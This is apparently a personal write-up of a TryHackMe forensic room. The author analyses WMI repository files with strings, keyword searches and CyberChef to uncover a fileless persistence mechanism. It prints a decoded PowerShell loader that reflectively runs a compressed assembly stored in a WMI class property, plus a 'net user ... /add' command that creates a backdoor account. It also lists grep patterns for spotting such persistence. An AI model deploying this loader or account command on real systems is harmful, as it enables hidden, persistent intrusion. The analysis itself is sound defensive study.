# After Hours

> **TryHackMe Room:** [After Hours](https://tryhackme.com/room/hh-afterhours-b090d1f0)

This write-up covers how I approached the room, step by step. Flags and specific key and password values are not included.

## Introduction

This room is a forensic analysis room touching on Windows, persistence, and reverse engineering. Along with the usual clues, concierge briefing, and the zip file to analyze, the room description also provided a directory and a password. I was not sure why these were needed, since I had done this room before and did not remember ever using them. It turns out they are for the AttackBox, which provides a tool to help locate the flag, something I never ended up using.

This room is fairly easy, even though it is rated medium.

## Getting into Action

Once I downloaded and extracted the zip file, it contained the following:

```text
INDEX.BTR  MAPPING1.MAP  MAPPING2.MAP  MAPPING3.MAP  OBJECTS.DATA
```

All of these are in `.DATA`-style binary formats. Reading them directly produced a mix of gibberish (shown as question mark characters) alongside some readable text, and some files contained nothing but gibberish. I ran each one through `strings` and saved the output to individual `txt` files.

Having relied on outside help the first time I did this room, I remembered that the main content lives in `OBJECTS.DATA`, so I focused on that file.

The `strings` output for `OBJECTS.DATA` was too long to review line by line, so I searched it for terms associated with WMI-based persistence:

```txt
"CommandLineEventConsumer|ActiveScriptEventConsumer|__EventFilter|FilterToConsumerBinding|Consumer|EventFilter"
```

followed by terms associated with common execution and obfuscation techniques:

```txt
"powershell|cmd.exe|wscript|cscript|base64|frombase64|invoke|encoded|payload|flag|thm"
```

This turned up a string that looked like base64-encoded text, repeated several times. Decoding it revealed the following:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

I then searched for "Win32_HardwareTelemetry," "ConfigData," and "string," which turned up another block of base64-encoded text, encoded multiple times over. Decoding it produced gibberish again, which I recognized as a binary file. The first time I did this room, I had converted that gibberish into a `.bin` file and inspected it with a hex dump (`xxd`) to find the flag. This time, I instead used CyberChef's Raw Inflate option, chained after the base64 decode, which produced the binary's raw text directly. It looked like this:

```txt
....
<Module>updates.exeProgramAfterHoursmscorlibSystemObjectMain.ctorSystem.Runtime.CompilerServicesCompilationRelaxationsAttributeRuntimeCompatibilityAttributeupdatesEnvironmentget_MachineNameStringStringComparisonEqualsSystem.DiagnosticsProcessStartInfoset_FileNameset_ArgumentsProcessWindowStyleset_WindowStyleset_CreateNoWindowProcessStartConsoleWriteLinebytelotusdccmd.exe/c net user patch <ENCODED_FLAG> /addOExecution halted: Environment mismatch
....
```

The flag itself was embedded as base64-encoded text within this output.

## Conclusion

I find forensic analysis rooms approachable, at least the ones I have done so far, along with more straightforward log analysis rooms. This room was also the first time I learned to read a binary file as a hex dump, the `xxd`-style view showing hexadecimal bytes on one side and their readable ASCII equivalents on the other. Recognizing the "MZ" header this way, and understanding what it signals about a Windows executable, was a useful takeaway on its own. The room also gave me some hands-on exposure to working with raw forensic artifact files like `INDEX.BTR` and the `.MAP` files, even though the actual flag ended up living in `OBJECTS.DATA`.
